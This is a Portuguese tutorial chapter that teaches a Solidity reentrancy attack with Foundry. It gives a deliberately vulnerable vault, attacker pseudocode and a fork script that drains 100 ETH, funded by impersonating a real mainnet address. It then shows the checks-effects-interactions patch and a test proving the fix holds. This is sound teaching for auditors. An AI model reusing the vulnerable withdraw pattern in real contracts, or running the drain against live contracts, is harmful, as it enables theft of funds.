# Fase 1 — Drenagem

O marco do plano: **fazer um script drenar dinheiro num fork e imprimir o
resultado.**

```
=================================================
            DRAIN CONCLUIDO
=================================================
  voltas da reentrancia  : 3
  ETH no vault  antes    : 100000000000000000000
  ETH no vault  depois   : 0
  ETH drenado            : 100000000000000000000
  LUCRO do atacante      : 100000000000000000000
  ETH que sobrou no vault: 0
```

---

## O alvo: `VaultVulneravel`

O bug mais caro da história: **reentrância**. A TheDAO perdeu 60M USD em 2016
com exatamente isto.

```solidity
function withdraw() external {
    require(balances[msg.sender] > 0, "sem deposito");
    uint256 valor = balances[msg.sender];        // checks

    (bool ok,) = msg.sender.call{value: valor}(""); // interactions  ← AQUI
    require(ok, "falha no envio");

    balances[msg.sender] = 0;                     // effects    ← tarde demais
}
```

O contrato **chama para fora** antes de **escrever no próprio storage**. A EVM
permite que o destinatário reconecte enquanto a chamada externa ainda não
terminou de executar — e como o saldo ainda consta cheio, ele saca de novo.

### O atacante

```
atacar():
    vault.deposit{value: giro}()      // capital de giro
    vault.withdraw()                  // saca. receive() vai reconectar.

receive():                            // disparado durante o withdraw()
    voltas++
    if vault ainda tem ETH:
        vault.withdraw()              // ← a volta
```

Lê de novo em `vault.sol`:
1. aVictima deposita 100 ETH;
2. o atacante saca e reconecta até o vault esvaziar;
3. o `assertGt(alvo.balance, antes)` do plano passa — com folga.

### Por que 3 voltas e não 100 mil

`capitalDeGiro = 50 ether`, saldo `100 ether`. Cada volta saca 50; sobra 50; mais
uma volta; sobra 0. Três voltas, resultado determinístico.

Com giro de 1 wei o laço rodaria 10¹⁸ vezes. Funciona, mas o teste fica lento.
Escolher o giro certo é o que separa PoC legível de PoC que trava o CI.

### O patch

`VaultCorrigido` inverte a ordem — **checks → effects → interactions**:

```solidity
balances[msg.sender] = 0;             // effects    ← ANTES
(bool ok,) = msg.sender.call{...}(""); // interactions
```

`test_vaultCorrigidoResiste` roda o mesmo ataque e exige o revert. Todo
relatório de bug sério tem essa metade: não basta provar que quebra, tem que
provar que o patch fecha.

---

## O terceiro teste: dinheiro de verdade

`test_drenarComSaldoRealMainnet` liga os dois mundos:

```solidity
uint256 saldoReal = ALVO_MAINNET.balance;      // 105.627 ETH, do bloco 19M
vm.prank(ALVO_MAINNET);                        // sai da conta desse endereço
(bool ok,) = address(vaultReal).call{value: 100 ether}("");
// ... drena ...
assertEq(address(drainReal).balance, 150 ether); // 50 de capital + 100 drenados
```

O ETH não veio de `vm.deal`. Veio de um endereço que **tem saldo na mainnet**,
transferido num fork. O alvo tem 105.627 ETH; nós pegamos 100.

---

## O script standalone

```bash
forge script script/F1Drain.s.sol:F1Drain \
  --rpc-url "$ETHEREUM_RPC_URL" \
  --fork-block-number 19000000 -vv
```

```
  bloco do fork    : 19000000
  chainid          : 1
  alvo mainnet     : 0x28C6c06298d514Db089934071355E5743bf21d60
  saldo do alvo    : 105627385179809479689008 wei
  voltas (reentrancia): 3
  ETH DRENADO      : 100000000000000000000
  capital de giro  : 50000000000000000000000
  recebido pelo atac. : 150000000000000000000
  LUCRO LIQUIDO    : 100000000000000000000
  drain bem-sucedido?  SIM
  estado revertido. mainnet intacta.
```

O script termina com `vm.revertToState(snapshotId)`: desfaz tudo explicitamente.
`forge script` sem `--broadcast` já descarta o estado, mas ser explícito ensina
o hábito — e é o que você vai querer em auditoria.

### Teste vs. script

| | `forge test` | `forge script` |
|---|---|---|
| Estado | descartado no fim | descartado **sem** `--broadcast` |
| Com `--broadcast` | — | **vai para a rede real** |
| Criação do fork | `vm.createSelectFork` | `--rpc-url` + `--fork-block-number` |

---

## Detalhes do Solidity que custaram tempo

Coisas que quebram na primeira tentativa e que estão comentadas no código:

**1. String não-ASCII não compila.** Solidity só aceita ASCII em string
literal. `"saldo não pode mudar"` → `error(8936)`. Comentário pode ter acento;
string não. Alternativa: `unicode"..."`.

**2. `console.log` fica ambíguo com literal inteiro.** `console.log("x:", 100 ether)`
→ *"Member `log` not unique"*, porque `100 ether` casa com overloads de `uintN`.
Use string, ou converta antes: `uint256 x = 100 ether; console.log("x:", x)`.

**3. `deal` de ERC-20 não tem `vm.`.** O `deal(to, amount)` é do cheatcode `Vm`;
o `deal(token, to, amount)` é função do `StdCheats` e se chama sem prefixo:

```solidity
vm.deal(alice, 1000 ether);              // ETH   — cheatcode
deal(address(token), bob, 777 ether);    // ERC20 — StdCheats, SEM vm.
```

---

**Anterior**: [Fase 0](01_FASE0_DIAGNOSTICO.md) · **Próxima**: [Cheatcodes](03_CHEATCODES.md)